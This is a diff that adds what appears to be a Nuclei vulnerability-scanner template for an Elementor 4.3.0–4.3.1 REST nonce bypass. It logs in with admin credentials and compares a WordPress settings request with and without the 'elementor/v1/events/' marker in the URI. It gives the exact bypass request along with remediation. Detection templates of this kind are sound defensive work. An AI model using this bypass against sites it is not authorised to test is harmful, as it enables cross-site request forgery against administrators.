@@ -1,0 +1,82 @@
+id: elementor-rest-nonce-bypass
+
+info:
+  name: Elementor 4.3.0 - 4.3.1 - REST Nonce Bypass
+  author: alex700
+  severity: medium
+  description: |
+    Elementor's Editor Events REST authentication filter in versions 4.3.0 and 4.3.1 trusts an events-route marker anywhere in the request URI. This template logs in through the standard /wp-login.php form with supplied administrator username and password, then compares denied baseline and near-miss requests with access to WordPress settings using the exact marker. The Editor Events experiment must be enabled. Custom login paths, SSO, and MFA are outside the validated login flow; no finding in those configurations does not establish that the issue is absent.
+  impact: |
+    A cross-site request using an administrator's browser session can reach protected REST routes without the required nonce, subject to the route's capability checks and browser cookie policy.
+  remediation: |
+    Update Elementor to 4.3.2 or later.
+  reference:
+    - https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites/
+  metadata:
+    max-request: 4
+    vendor: elementor
+    product: elementor
+    framework: wordpress
+  tags: wordpress,wp,wp-plugin,elementor,csrf,auth-bypass
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{url_encode(username)}}&pwd={{url_encode(password)}}&wp-submit=Log+In&testcookie=1
+
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302 && contains(tolower(header), "set-cookie: wordpress_logged_in_")'
+        internal: true
+    extractors:
+      - type: regex
+        name: wp_cookie
+        part: header
+        regex:
+          - '(?im)^Set-Cookie: (wordpress_logged_in_[^=;\s]+=[^;\r\n]+)'
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{wp_cookie}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401 && contains(body, "rest_forbidden")'
+        internal: true
+
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings&elementor/v1/eventz/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{wp_cookie}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401 && contains(body, "rest_forbidden")'
+        internal: true
+
+  - raw:
+      - |
+        GET /?rest_route=/wp/v2/settings&elementor/v1/events/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{wp_cookie}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(content_type, "application/json") && contains_all(body, "\"title\"", "\"email\"", "\"timezone\"")'
